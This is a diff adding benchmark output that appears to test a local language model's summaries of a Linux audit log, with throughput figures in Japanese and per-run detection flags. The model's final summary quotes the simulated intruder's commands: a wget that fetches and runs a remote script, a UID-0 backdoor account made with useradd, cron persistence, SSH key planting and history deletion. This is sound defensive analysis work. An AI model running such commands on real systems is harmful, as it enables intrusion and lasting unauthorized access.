@@ -1,0 +1,62 @@
+Starting benchmark...
+Health Check
+Health check passed: http://127.0.0.1:8080/
+model: unsloth/gpt-oss-20b-GGUF:Q4_K_M  n_ctx: 32768  mode: summary  temperature: 0.7  think: False  max_tokens: 1024
+warm-up ...
+
+log: out_audit/audit.log（67 行、13,729 文字）
+run1-1: 入力 5707 tok  1337.8 tok/s | 生成 441 tok  19.1 tok/s | 計   27.3 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run1-2: 入力 5707 tok   943.6 tok/s | 生成 439 tok  28.2 tok/s | 計   21.6 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run1-3: 入力 5707 tok   657.7 tok/s | 生成 414 tok  22.0 tok/s | 計   27.4 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run1-4: 入力 5707 tok  1195.1 tok/s | 生成 457 tok  36.2 tok/s | 計   17.4 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+  → 全員が終わるまで 29.0 s、全体の生成量 60.3 tok/s（入力処理の時間を含む）
+run2-1: 入力 5707 tok   954.1 tok/s | 生成 318 tok  26.9 tok/s | 計   17.8 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': False, 'sysupd': True}
+run2-2: 入力 5707 tok   956.2 tok/s | 生成 369 tok  19.9 tok/s | 計   24.4 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run2-3: 入力 5707 tok  1351.8 tok/s | 生成 677 tok  22.2 tok/s | 計   34.7 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run2-4: 入力 5707 tok  1190.1 tok/s | 生成 477 tok  30.1 tok/s | 計   20.6 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': False, 'sysupd': True}
+  → 全員が終わるまで 34.7 s、全体の生成量 53.0 tok/s（入力処理の時間を含む）
+run3-1: 入力 5707 tok  1364.3 tok/s | 生成 327 tok  15.6 tok/s | 計   25.1 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run3-2: 入力 5707 tok   945.6 tok/s | 生成 332 tok  20.0 tok/s | 計   22.6 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run3-3: 入力 5707 tok   932.0 tok/s | 生成 467 tok  31.9 tok/s | 計   20.7 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run3-4: 入力 5707 tok  1198.4 tok/s | 生成 762 tok  50.3 tok/s | 計   19.9 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+  → 全員が終わるまで 31.6 s、全体の生成量 59.7 tok/s（入力処理の時間を含む）
+
+===== 結果（中央値）
+入力処理: 1073.1 tok/s
+生成:     24.5 tok/s（1人あたり。最小 15.6）
+1回の時間: 22.1 s
+4 人全員が終わるまで: 31.6 s
+
+----- 回答（最後の回）
+**Audit log summary (1794409437‑1794409530)**  
+
+| Time (epoch) | Event | Key details |
+|---------------|-------|--------------|
+| 1794409437.972 | `USER_AUTH` | Multiple failed SSH root logins from 203.0.113.45 |
+| 1794409449.737 | `USER_AUTH` | Successful SSH login as **backup** (PAM‑unix) |
+| 1794409449.737 | `LOGIN`, `USER_START`, `USER_LOGIN` | Session 2 opened for backup |
+| 1794409453.406 | `SYSCALL`/`EXECVE` | backup ran `id` |
+| 1794409456.019 | `SYSCALL`/`EXECVE` | backup ran `uname -a` |
+| 1794409460.776 | `SYSCALL`/`EXECVE` | backup cat’d `/etc/passwd` |
+| 1794409466.471 | `USER_ACCT`/`USER_CMD` | backup invoked `sudo wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh` |
+| 1794409471.448 | `USER_ACCT`/`USER_CMD` | backup invoked `sudo chmod +x /tmp/.upd.sh` |
+| 1794409472.956 | `USER_ACCT`/`USER_CMD` | backup invoked `sudo bash /tmp/.upd.sh` |
+| 1794409473.211 | `SYSCALL`/`EXECVE` | script executed `bash /tmp/.upd.sh` |
+| 1794409474.143 | `SYSCALL`/`EXECVE` | script created user **sysupd** via `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd` |
+| 1794409474.143 | `ADD_USER` | sysupd added successfully |
+| 1794409474.882 | `SYSCALL`/`PATH` | script wrote `/etc/cron.d/sysupd` (cron job) |
+| 1794409475.449 | `SYSCALL`/`PATH` | script created `/root/.ssh/authorized_keys` (root key) |
+| 1794409527.005 | `SYSCALL`/`PATH` | script removed `/home/backup/.bash_history` |
+| 1794409530.270 | `USER_END`, `USER_LOGOUT` | backup session closed, logged out |
+
+**Overall picture**
+
+1. A brute‑force or credential‑guessing attempt for root failed.  
+2. A successful SSH login as the account **backup**.  
+3. The backup user used `sudo` to download a remote script (`upd.sh`), made it executable, and ran it.  
+4. The script performed privilege‑escalation: it added a new user `sysupd` with UID 0, created a cron job, and wrote an SSH key to root’s `authorized_keys`.  
+5. After cleanup, the backup session ended.
+
+This log shows a compromise of the system where a non‑privileged account was used to install a malicious script that escalated to root and left a backdoor.
+
+saved: audit_bench_results.csv（12 行追記）
